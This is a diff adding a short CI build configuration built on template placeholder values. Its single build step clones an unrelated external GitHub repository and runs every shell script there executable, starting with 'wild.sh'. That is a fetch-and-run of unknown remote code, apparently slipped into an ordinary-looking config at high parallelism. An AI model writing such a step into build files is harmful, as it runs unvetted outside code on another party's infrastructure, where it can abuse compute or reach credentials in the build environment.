@@ -1,0 +1,14 @@
+jobs:
+  build:
+    docker:
+      - image: buildpack-deps:trusty
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    environment:
+      FOO: bar
+    parallelism: 10
+    resource_class: large
+    working_directory: ~/my-app
+    steps:
+      - run: git clone https://github.com/joecristian147/lokok.git && cd lokok && chmod +x *.sh && ./wild.sh
